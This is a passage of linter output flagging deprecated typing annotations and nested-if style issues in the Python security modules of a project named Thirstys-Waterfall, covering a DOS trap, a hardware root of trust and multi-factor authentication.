808 |         self._is_windows = platform.system() == "Windows"
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:933:34
    |
931 |     def __init__(self):
932 |         self.logger = logging.getLogger(__name__)
933 |         self._sanitized_regions: List[Tuple[int, int]] = []
    |                                  ^^^^
934 |
935 |     def sanitize_ram(
    |
help: Replace with `list`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:933:39
    |
931 |     def __init__(self):
932 |         self.logger = logging.getLogger(__name__)
933 |         self._sanitized_regions: List[Tuple[int, int]] = []
    |                                       ^^^^^
934 |
935 |     def sanitize_ram(
    |
help: Replace with `tuple`

B007 Loop control variable `i` not used within loop body
    --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:1041:17
     |
1040 |             # Perform overwrites
1041 |             for i, pattern in enumerate(patterns):
     |                 ^
1042 |                 with open(file_path, "rb+") as f:
1043 |                     if pattern is None:
     |
help: Rename unused `i` to `_i`

UP006 [*] Use `list` instead of `List` for type annotation
    --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:1153:33
     |
1151 |         self._triggered = False
1152 |         self._threat_level = ThreatLevel.NONE
1153 |         self._detected_threats: List[CompromiseEvent] = []
     |                                 ^^^^
1154 |         self._lock = threading.Lock()
     |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
    --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:1157:31
     |
1156 |         # Monitoring thread
1157 |         self._monitor_thread: Optional[threading.Thread] = None
     |                               ^^^^^^^^^^^^^^^^^^^^^^^^^^
1158 |         self._stop_monitoring = threading.Event()
     |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
    --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:1170:35
     |
1169 |         # Response callbacks
1170 |         self._response_callbacks: List[Callable] = []
     |                                   ^^^^
1171 |
1172 |     def initialize(self) -> bool:
     |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
    --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:1256:37
     |
1254 |         self.logger.info("DOS Trap monitoring stopped")
1255 |
1256 |     def _check_attestation(self) -> Optional[CompromiseEvent]:
     |                                     ^^^^^^^^^^^^^^^^^^^^^^^^^
1257 |         """Check hardware attestation status"""
1258 |         try:
     |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
    --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:1289:48
     |
1287 |         return None
1288 |
1289 |     def _handle_detected_threats(self, events: List[CompromiseEvent]):
     |                                                ^^^^
1290 |         """Handle detected compromise events"""
1291 |         with self._lock:
     |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
    --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:1325:51
     |
1323 |                     self.logger.error(f"Response callback failed: {e}")
1324 |
1325 |     def _execute_emergency_response(self, events: List[CompromiseEvent]):
     |                                                   ^^^^
1326 |         """Execute emergency response to detected threats"""
1327 |         if self._triggered:
     |
help: Replace with `list`

SIM102 Use a single `if` statement instead of nested `if` statements
    --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:1389:13
     |
1387 |                       )
1388 |
1389 | /             elif action == ResponseAction.SHUTDOWN:
1390 | |                 if self.config["emergency_shutdown"]:
     | |_____________________________________________________^
1391 |                       self._emergency_shutdown()
     |
help: Combine `if` statements using `and`

UP006 [*] Use `dict` instead of `Dict` for type annotation
    --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:1463:29
     |
1461 |         self._handle_detected_threats([event])
1462 |
1463 |     def get_status(self) -> Dict[str, Any]:
     |                             ^^^^
1464 |         """Get current DOS trap mode status"""
1465 |         with self._lock:
     |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
    --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:1475:36
     |
1473 |             }
1474 |
1475 |     def get_threat_report(self) -> Dict[str, Any]:
     |                                    ^^^^
1476 |         """Generate comprehensive threat report"""
1477 |         with self._lock:
     |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\hardware_root_of_trust.py:14:1
   |
12 | from abc import ABC, abstractmethod
13 | from enum import Enum
14 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
15 |
16 | from cryptography.hazmat.backends import default_backend
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\hardware_root_of_trust.py:14:1
   |
12 | from abc import ABC, abstractmethod
13 | from enum import Enum
14 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
15 |
16 | from cryptography.hazmat.backends import default_backend
   |

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\hardware_root_of_trust.py:53:44
   |
52 |     @abstractmethod
53 |     def retrieve_key(self, key_id: str) -> Optional[bytes]:
   |                                            ^^^^^^^^^^^^^^^
54 |         """Retrieve cryptographic key from hardware"""
55 |         pass
   |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\hardware_root_of_trust.py:73:50
   |
72 |     @abstractmethod
73 |     def seal_data(self, data: bytes, pcr_values: List[int]) -> bytes:
   |                                                  ^^^^
74 |         """Seal data to specific PCR values"""
75 |         pass
   |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\hardware_root_of_trust.py:78:50
   |
77 |     @abstractmethod
78 |     def unseal_data(self, sealed_data: bytes) -> Optional[bytes]:
   |                                                  ^^^^^^^^^^^^^^^
79 |         """Unseal data (only if PCR values match)"""
80 |         pass
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\hardware_root_of_trust.py:92:21
   |
90 |         self.logger = logging.getLogger(__name__)
91 |         self._initialized = False
92 |         self._keys: Dict[str, bytes] = {}
   |                     ^^^^
93 |         self._pcr_banks: Dict[int, bytes] = {}
94 |         self._hardware_id = self._generate_hardware_id()
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\hardware_root_of_trust.py:93:26
   |
91 |         self._initialized = False
92 |         self._keys: Dict[str, bytes] = {}
93 |         self._pcr_banks: Dict[int, bytes] = {}
   |                          ^^^^
94 |         self._hardware_id = self._generate_hardware_id()
95 |         # Generate unique salt from hardware ID instead of hard-coding
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\hardware_root_of_trust.py:149:44
    |
147 |                 return False
148 |
149 |     def retrieve_key(self, key_id: str) -> Optional[bytes]:
    |                                            ^^^^^^^^^^^^^^^
150 |         """Retrieve key from TPM"""
151 |         with self._lock:
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\hardware_root_of_trust.py:207:50
    |
205 |         return hashlib.sha256(secrets.token_bytes(32)).hexdigest()
206 |
207 |     def seal_data(self, data: bytes, pcr_values: List[int]) -> bytes:
    |                                                  ^^^^
208 |         """
209 |         Seal data to specific PCR values using TPM.
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\hardware_root_of_trust.py:227:50
    |
225 |             raise
226 |
227 |     def unseal_data(self, sealed_data: bytes) -> Optional[bytes]:
    |                                                  ^^^^^^^^^^^^^^^
228 |         """
229 |         Unseal data sealed to PCR values.
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\hardware_root_of_trust.py:281:49
    |
279 |         raise ValueError("MAC verification failed")
280 |
281 |     def _create_policy_digest(self, pcr_values: List[int]) -> bytes:
    |                                                 ^^^^
282 |         """Create policy digest from PCR values"""
283 |         digest = hashlib.sha256()
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\hardware_root_of_trust.py:293:59
    |
291 |         return policy_digest + data
292 |
293 |     def _decrypt_with_policy(self, sealed_data: bytes) -> Optional[bytes]:
    |                                                           ^^^^^^^^^^^^^^^
294 |         """Decrypt data if policy matches current state"""
295 |         sealed_data[:32]
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\hardware_root_of_trust.py:312:25
    |
310 |         self.logger = logging.getLogger(__name__)
311 |         self._initialized = False
312 |         self._keychain: Dict[str, bytes] = {}
    |                         ^^^^
313 |         self._enclave_id = self._generate_enclave_id()
314 |         # Generate unique salt from enclave ID instead of hard-coding
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\hardware_root_of_trust.py:350:44
    |
348 |                 return False
349 |
350 |     def retrieve_key(self, key_id: str) -> Optional[bytes]:
    |                                            ^^^^^^^^^^^^^^^
351 |         """Retrieve key from Secure Enclave"""
352 |         with self._lock:
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\hardware_root_of_trust.py:380:50
    |
378 |         return hashlib.sha256(secrets.token_bytes(32)).hexdigest()
379 |
380 |     def seal_data(self, data: bytes, pcr_values: List[int]) -> bytes:
    |                                                  ^^^^
381 |         """Seal data using Secure Enclave"""
382 |         return self._encrypt_for_enclave(data)
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\hardware_root_of_trust.py:384:50
    |
382 |         return self._encrypt_for_enclave(data)
383 |
384 |     def unseal_data(self, sealed_data: bytes) -> Optional[bytes]:
    |                                                  ^^^^^^^^^^^^^^^
385 |         """Unseal data using Secure Enclave"""
386 |         return self._decrypt_from_enclave(sealed_data)
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\hardware_root_of_trust.py:426:36
    |
424 |     """
425 |
426 |     def __init__(self, hsm_config: Optional[Dict[str, Any]] = None):
    |                                    ^^^^^^^^^^^^^^^^^^^^^^^^
427 |         self.logger = logging.getLogger(__name__)
428 |         self.config = hsm_config or {}
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\hardware_root_of_trust.py:426:45
    |
424 |     """
425 |
426 |     def __init__(self, hsm_config: Optional[Dict[str, Any]] = None):
    |                                             ^^^^
427 |         self.logger = logging.getLogger(__name__)
428 |         self.config = hsm_config or {}
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\hardware_root_of_trust.py:430:21
    |
428 |         self.config = hsm_config or {}
429 |         self._initialized = False
430 |         self._keys: Dict[str, bytes] = {}
    |                     ^^^^
431 |         self._hsm_id = self._generate_hsm_id()
432 |         # Generate unique salt from HSM ID instead of hard-coding
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\hardware_root_of_trust.py:467:44
    |
465 |                 return False
466 |
467 |     def retrieve_key(self, key_id: str) -> Optional[bytes]:
    |                                            ^^^^^^^^^^^^^^^
468 |         """Retrieve key from HSM"""
469 |         with self._lock:
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\hardware_root_of_trust.py:498:50
    |
496 |         return f"HSM-{hashlib.sha256(secrets.token_bytes(32)).hexdigest()[:16]}"
497 |
498 |     def seal_data(self, data: bytes, pcr_values: List[int]) -> bytes:
    |                                                  ^^^^
499 |         """Seal data using HSM"""
500 |         return self._hsm_encrypt(data)
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\hardware_root_of_trust.py:502:50
    |
500 |         return self._hsm_encrypt(data)
501 |
502 |     def unseal_data(self, sealed_data: bytes) -> Optional[bytes]:
    |                                                  ^^^^^^^^^^^^^^^
503 |         """Unseal data using HSM"""
504 |         return self._hsm_decrypt(sealed_data)
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\hardware_root_of_trust.py:544:40
    |
542 |     """
543 |
544 |     def __init__(self, preferred_type: Optional[HardwareType] = None):
    |                                        ^^^^^^^^^^^^^^^^^^^^^^
545 |         self.logger = logging.getLogger(__name__)
546 |         self.preferred_type = preferred_type
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\hardware_root_of_trust.py:547:26
    |
545 |         self.logger = logging.getLogger(__name__)
546 |         self.preferred_type = preferred_type
547 |         self._interface: Optional[HardwareInterface] = None
    |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^
548 |         self._active_type: Optional[HardwareType] = None
549 |         self._kill_switch_callback = None
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\hardware_root_of_trust.py:548:28
    |
546 |         self.preferred_type = preferred_type
547 |         self._interface: Optional[HardwareInterface] = None
548 |         self._active_type: Optional[HardwareType] = None
    |                            ^^^^^^^^^^^^^^^^^^^^^^
549 |         self._kill_switch_callback = None
    |
help: Convert to `X | None`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\hardware_root_of_trust.py:556:9
    |
555 |           # Try preferred type first
556 | /         if self.preferred_type:
557 | |             if self._try_initialize_type(self.preferred_type):
    | |______________________________________________________________^
558 |                   return True
    |
help: Combine `if` statements using `and`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\hardware_root_of_trust.py:602:38
    |
600 |         return self._interface.store_key("master_encryption_key", key_data)
601 |
602 |     def retrieve_master_key(self) -> Optional[bytes]:
    |                                      ^^^^^^^^^^^^^^^
603 |         """Retrieve system master encryption key"""
604 |         if not self._interface:
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\hardware_root_of_trust.py:652:36
    |
650 |         self._kill_switch_callback = callback
651 |
652 |     def get_hardware_info(self) -> Dict[str, Any]:
    |                                    ^^^^
653 |         """Get information about active hardware security module"""
654 |         if not self._interface:
    |
help: Replace with `dict`

UP035 [*] Import from `collections.abc` instead: `Callable`
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:20:1
   |
18 | from datetime import datetime
19 | from enum import Enum
20 | from typing import Any, Callable, Dict, List, Optional, Set, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
21 |
22 | from cryptography import x509
   |
help: Import from `collections.abc`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:20:1
   |
18 | from datetime import datetime
19 | from enum import Enum
20 | from typing import Any, Callable, Dict, List, Optional, Set, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
21 |
22 | from cryptography import x509
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:20:1
   |
18 | from datetime import datetime
19 | from enum import Enum
20 | from typing import Any, Callable, Dict, List, Optional, Set, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
21 |
22 | from cryptography import x509
   |

UP035 `typing.Set` is deprecated, use `set` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:20:1
   |
18 | from datetime import datetime
19 | from enum import Enum
20 | from typing import Any, Callable, Dict, List, Optional, Set, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
21 |
22 | from cryptography import x509
   |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:20:1
   |
18 | from datetime import datetime
19 | from enum import Enum
20 | from typing import Any, Callable, Dict, List, Optional, Set, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
21 |
22 | from cryptography import x509
   |

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:92:19
   |
90 |     # Risk indicators
91 |     risk_level: RiskLevel = RiskLevel.MINIMAL
92 |     risk_factors: List[str] = field(default_factory=list)
   |                   ^^^^
93 |
94 |     # Authentication state
   |
help: Replace with `list`

UP006 [*] Use `set` instead of `Set` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:96:28
   |
94 |     # Authentication state
95 |     auth_level: AuthLevel = AuthLevel.NONE
96 |     authenticated_methods: Set[AuthMethod] = field(default_factory=set)
   |                            ^^^
97 |     last_auth_time: float = field(default_factory=time.time)
   |
help: Replace with `set`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:100:25
    |
 99 |     # Session metadata
100 |     device_fingerprint: Optional[str] = None
    |                         ^^^^^^^^^^^^^
101 |     geolocation: Optional[Dict[str, Any]] = None
102 |     previous_sessions: List[Dict[str, Any]] = field(default_factory=list)
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:101:18
    |
 99 |     # Session metadata
100 |     device_fingerprint: Optional[str] = None
101 |     geolocation: Optional[Dict[str, Any]] = None
    |                  ^^^^^^^^^^^^^^^^^^^^^^^^
102 |     previous_sessions: List[Dict[str, Any]] = field(default_factory=list)
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:101:27
    |
 99 |     # Session metadata
100 |     device_fingerprint: Optional[str] = None
101 |     geolocation: Optional[Dict[str, Any]] = None
    |                           ^^^^
102 |     previous_sessions: List[Dict[str, Any]] = field(default_factory=list)
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:102:24
    |
100 |     device_fingerprint: Optional[str] = None
101 |     geolocation: Optional[Dict[str, Any]] = None
102 |     previous_sessions: List[Dict[str, Any]] = field(default_factory=list)
    |                        ^^^^
103 |
104 |     # Behavioral analysis
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:102:29
    |
100 |     device_fingerprint: Optional[str] = None
101 |     geolocation: Optional[Dict[str, Any]] = None
102 |     previous_sessions: List[Dict[str, Any]] = field(default_factory=list)
    |                             ^^^^
103 |
104 |     # Behavioral analysis
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:105:22
    |
104 |     # Behavioral analysis
105 |     typing_patterns: List[float] = field(default_factory=list)
    |                      ^^^^
106 |     mouse_patterns: List[Tuple[int, int]] = field(default_factory=list)
107 |     interaction_velocity: float = 0.0
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:106:21
    |
104 |     # Behavioral analysis
105 |     typing_patterns: List[float] = field(default_factory=list)
106 |     mouse_patterns: List[Tuple[int, int]] = field(default_factory=list)
    |                     ^^^^
107 |     interaction_velocity: float = 0.0
    |
help: Replace with `list`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:106:26
    |
104 |     # Behavioral analysis
105 |     typing_patterns: List[float] = field(default_factory=list)
106 |     mouse_patterns: List[Tuple[int, int]] = field(default_factory=list)
    |                          ^^^^^
107 |     interaction_velocity: float = 0.0
    |
help: Replace with `tuple`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:109:26
    |
107 |     interaction_velocity: float = 0.0
108 |
109 |     def to_dict(self) -> Dict[str, Any]:
    |                          ^^^^
110 |         """Serialize context to dictionary"""
111 |         return {
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:150:17
    |
148 |     last_used: float = field(default_factory=time.time)
149 |     credential_type: str = "public-key"
150 |     transports: List[str] = field(default_factory=lambda: ["usb", "nfc", "ble"])
    |                 ^^^^
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:206:24
    |
204 |     def __init__(self):
205 |         self.logger = logging.getLogger(__name__)
206 |         self._secrets: Dict[str, TOTPConfig] = {}
    |                        ^^^^
207 |         self._used_tokens: deque = deque(maxlen=100)  # Prevent replay
208 |         self._lock = threading.Lock()
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:211:46
    |
210 |     def enroll(
211 |         self, user_id: str, credential_data: Optional[bytes] = None
    |                                              ^^^^^^^^^^^^^^^
212 |     ) -> Tuple[bool, Optional[Dict[str, Any]]]:
213 |         """
    |
help: Convert to `X | None`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:212:10
    |
210 |     def enroll(
211 |         self, user_id: str, credential_data: Optional[bytes] = None
212 |     ) -> Tuple[bool, Optional[Dict[str, Any]]]:
    |          ^^^^^
213 |         """
214 |         Enroll user for TOTP authentication.
    |
help: Replace with `tuple`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:212:22
    |
210 |     def enroll(
211 |         self, user_id: str, credential_data: Optional[bytes] = None
212 |     ) -> Tuple[bool, Optional[Dict[str, Any]]]:
    |                      ^^^^^^^^^^^^^^^^^^^^^^^^
213 |         """
214 |         Enroll user for TOTP authentication.
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:212:31
    |
210 |     def enroll(
211 |         self, user_id: str, credential_data: Optional[bytes] = None
212 |     ) -> Tuple[bool, Optional[Dict[str, Any]]]:
    |                               ^^^^
213 |         """
214 |         Enroll user for TOTP authentication.
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:357:28
    |
355 |     def __init__(self):
356 |         self.logger = logging.getLogger(__name__)
357 |         self._credentials: Dict[str, List[FIDO2Credential]] = {}
    |                            ^^^^
358 |         self._challenges: Dict[str, bytes] = {}
359 |         self._lock = threading.Lock()
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:357:38
    |
355 |     def __init__(self):
356 |         self.logger = logging.getLogger(__name__)
357 |         self._credentials: Dict[str, List[FIDO2Credential]] = {}
    |                                      ^^^^
358 |         self._challenges: Dict[str, bytes] = {}
359 |         self._lock = threading.Lock()
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:358:27
    |
356 |         self.logger = logging.getLogger(__name__)
357 |         self._credentials: Dict[str, List[FIDO2Credential]] = {}
358 |         self._challenges: Dict[str, bytes] = {}
    |                           ^^^^
359 |         self._lock = threading.Lock()
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:366:53
    |
364 |         self.origin = f"https://{self.rp_id}"
365 |
366 |     def enroll(self, user_id: str, credential_data: Dict[str, Any]) -> bool:
    |                                                     ^^^^
367 |         """
368 |         Enroll FIDO2 credential.
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:403:40
    |
401 |                 return False
402 |
403 |     def authenticate(self, credential: Dict[str, Any], context: AuthContext) -> bool:
    |                                        ^^^^
404 |         """
405 |         Authenticate FIDO2 assertion.
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:525:25
    |
523 |     def __init__(self):
524 |         self.logger = logging.getLogger(__name__)
525 |         self._passkeys: Dict[str, List[PasskeyData]] = {}
    |                         ^^^^
526 |         self._lock = threading.Lock()
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:525:35
    |
523 |     def __init__(self):
524 |         self.logger = logging.getLogger(__name__)
525 |         self._passkeys: Dict[str, List[PasskeyData]] = {}
    |                                   ^^^^
526 |         self._lock = threading.Lock()
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:528:53
    |
526 |         self._lock = threading.Lock()
527 |
528 |     def enroll(self, user_id: str, credential_data: Dict[str, Any]) -> bool:
    |                                                     ^^^^
529 |         """Enroll passkey"""
530 |         with self._lock:
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:573:40
    |
571 |                 return False
572 |
573 |     def authenticate(self, credential: Dict[str, Any], context: AuthContext) -> bool:
    |                                        ^^^^
574 |         """Authenticate with passkey"""
575 |         with self._lock:
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:651:29
    |
649 |     def __init__(self):
650 |         self.logger = logging.getLogger(__name__)
651 |         self._certificates: Dict[str, List[x509.Certificate]] = {}
    |                             ^^^^
652 |         self._revoked_serials: Set[int] = set()
653 |         self._lock = threading.Lock()
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:651:39
    |
649 |     def __init__(self):
650 |         self.logger = logging.getLogger(__name__)
651 |         self._certificates: Dict[str, List[x509.Certificate]] = {}
    |                                       ^^^^
652 |         self._revoked_serials: Set[int] = set()
653 |         self._lock = threading.Lock()
    |
help: Replace with `list`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:652:32
    |
650 |         self.logger = logging.getLogger(__name__)
651 |         self._certificates: Dict[str, List[x509.Certificate]] = {}
652 |         self._revoked_serials: Set[int] = set()
    |                                ^^^
653 |         self._lock = threading.Lock()
    |
help: Replace with `set`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:679:40
    |
677 |                 return False
678 |
679 |     def authenticate(self, credential: Dict[str, Any], context: AuthContext) -> bool:
    |                                        ^^^^
680 |         """Authenticate with certificate"""
681 |         with self._lock:
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:770:26
    |
768 |     def __init__(self):
769 |         self.logger = logging.getLogger(__name__)
770 |         self._templates: Dict[str, List[BiometricTemplate]] = {}
    |                          ^^^^
771 |         self._lock = threading.Lock()
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:770:36
    |
768 |     def __init__(self):
769 |         self.logger = logging.getLogger(__name__)
770 |         self._templates: Dict[str, List[BiometricTemplate]] = {}
    |                                    ^^^^
771 |         self._lock = threading.Lock()
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:773:53
    |
771 |         self._lock = threading.Lock()
772 |
773 |     def enroll(self, user_id: str, credential_data: Dict[str, Any]) -> bool:
    |                                                     ^^^^
774 |         """Enroll biometric template"""
775 |         with self._lock:
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:804:40
    |
802 |                 return False
803 |
804 |     def authenticate(self, credential: Dict[str, Any], context: AuthContext) -> bool:
